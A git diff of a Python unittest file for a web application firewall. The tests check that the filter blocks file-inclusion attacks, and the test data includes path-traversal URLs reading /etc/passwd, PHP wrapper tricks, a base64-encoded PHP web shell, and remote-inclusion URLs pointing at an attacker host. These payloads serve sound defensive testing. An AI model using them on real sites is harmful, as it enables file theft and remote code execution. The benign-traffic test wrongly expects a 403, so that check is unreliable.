@@ -2,45 +2,41 @@ import unittest
 
 from web_application_firewall.project import filtering
 
-"""
-Path_Traversal_1 = "http://vulnerable-site.com/index.php?page=../../../etc/passwd"
-Path_Traversal_2 = "http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd"
-Path_Traversal_3 = "http://vulnerable-site.com/index.php?page=....\/....\/....\/etc/passwd"
-Path_Traversal_4 = "http://vulnerable-site.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
 
-Null_Byte_Injection = "http://vulnerable-site.com/index.php?page=../../../etc/passwd%00"
+class TestFileInclusion(unittest.TestCase):
 
-Encoding_1 = "http://vulnerable-site.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd"
-Encoding_2 = "http://vulnerable-site.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
-Encoding_3 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd"
-Encoding_4 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd%00"
+    def test_sanity(self):
+        self.assertEqual(True, True)
 
-Existing_Folder = "http://vulnerable-site.com/index.php?page=utils/scripts/../../../../../etc/passwd"
-
-Path_Truncation_1 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\."
-Path_Truncation_2 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././."
-Path_Truncation_3 = "http://vulnerable-site.com/index.php?page=a/./.[ADD MORE]/etc/passwd"
-Path_Truncation_4 = "http://vulnerable-site.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd"
-
-
-RFI_1 = "http://vulnerable-site.com/index.php?page=http://atacker.com/evil.php"
-RFI_2 = "http://vulnerable-site.com/index.php?page=\\attacker.com\evil.php"
-
-
-
-"""
-class testFileInclusion(unittest.TestCase):
-
-    def testSanity(self):
-        self.assertEqual(True,True)
-
-    def testGoodPacket(self):
+    def test_good_packet(self):
         normal_1 = "http://www.google.com/page/"
+        normal_2 = "https://www.google.com/search?q=file+inclusion&client=firefox-b-d&ei=kog6Y4HgF7n14-EP-sGqwAU&ved=0ahUKEwiB8a6zvsP6AhW5-jgGHfqgClgQ4dUDCA0&uact=5&oq=file+inclusion&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEOgoIABBHENYEELADOgQIABBDOgsIABCABBCxAxCDAToLCC4QgAQQsQMQgwE6CAguELEDEIMBOhEILhCABBCxAxCDARDHARDRAzoLCC4QsQMQgwEQ1AI6BQgAEJECOggIABCABBCxAzoRCC4QgAQQsQMQgwEQxwEQrwE6FAguEIAEELEDEIMBEMcBEK8BENQCOggIABCxAxCRAjoICAAQsQMQgwE6BwgAEIAEEApKBAhBGABKBAhGGABQ_g1YsSBg7SJoA3ABeAGAAZMEiAHmHJIBCjItMTAuMi4wLjGYAQCgAQHIAQjAAQE&sclient=gws-wiz"
 
-        result = filtering.check(normal_1)
-        self.assertEqual(result, "200")
+        packets = [normal_1,normal_2]
 
-    def testPHPWrapper(self):
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_path_traversal(self):
+        path_traversal_1 = "http://vulnerable-site.com/index.php?page=../../../etc/passwd"
+        path_traversal_2 = "http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd"
+        path_traversal_3 = "http://vulnerable-site.com/index.php?page=....\\/....\\/....\\/etc/passwd"
+        path_traversal_4 = "http://vulnerable-site.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
+
+        packets = [path_traversal_1, path_traversal_2, path_traversal_3, path_traversal_4]
+
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_php_wrapper(self):
         filter_1 = "http://vulnerable-site.com/index.php?page=php://filter/read=string.rot13/resource=index.php"
         filter_2 = "http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"
         filter_3 = "http://vulnerable-site.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php"
@@ -51,16 +47,83 @@ class testFileInclusion(unittest.TestCase):
         data_1 = "http://vulnerable-site.com/?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>\""
         data_2 = "http://vulnerable-site.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
 
-        packets = [filter_1,filter_2,filter_3,zlib,zip_wrapper,data_1,data_2]
+        packets = [filter_1, filter_2, filter_3, zlib, zip_wrapper, data_1, data_2]
 
         result = ""
         for i in packets:
             result = filtering.check(i)
             if result == "200":
                 break
-        self.assertEqual(result, "403")
+        self.assertEqual(result, "403", i)
 
-    def testFilterBypass(self):
+    def test_encoding(self):
+        encoding_1 = "http://vulnerable-site.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd"
+        encoding_2 = "http://vulnerable-site.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+        encoding_3 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd"
+        encoding_4 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd%00"
+
+        packets = [encoding_1, encoding_2, encoding_3, encoding_4]
+
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_null_byte_injection(self):
+        null_byte_injection = "http://vulnerable-site.com/index.php?page=../../../etc/passwd%00"
+
+        packets = [null_byte_injection]
+
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_access_folder(self):
+        existing_folder = "http://vulnerable-site.com/index.php?page=utils/scripts/../../../../../etc/passwd"
+
+        packets = [existing_folder]
+
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_path_truncation(self):
+        path_truncation_1 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd..\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\[ADD MORE]\\.\\."
+        path_truncation_2 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././."
+        path_truncation_3 = "http://vulnerable-site.com/index.php?page=a/./.[ADD MORE]/etc/passwd"
+        path_truncation_4 = "http://vulnerable-site.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd"
+
+        packets = [path_truncation_1, path_truncation_2, path_truncation_3, path_truncation_4]
+
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_rfi(self):
+        rfi_1 = "http://vulnerable-site.com/index.php?page=http://atacker.com/evil.php"
+        rfi_2 = "http://vulnerable-site.com/index.php?page=\\\\attacker.com\\evil.php"
+
+        packets = [rfi_1, rfi_2]
+
+        result = ""
+        for i in packets:
+            result = filtering.check(i)
+            if result == "200":
+                break
+        self.assertEqual(result, "403", i)
+
+    def test_filter_bypass(self):
         filter_bypass_1 = "http://vulnerable-site.com/index.php?page=....//....//etc/passwd"
         filter_bypass_2 = "http://vulnerable-site.com/index.php?page=..///////..////..//////etc/passwd"
         filter_bypass_3 = "http://vulnerable-site.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
@@ -77,7 +140,7 @@ class testFileInclusion(unittest.TestCase):
             result = filtering.check(i)
             if result == "200":
                 break
-        self.assertEqual(result, "403")
+        self.assertEqual(result, "403", i)
 
 
 if __name__ == '__main__':
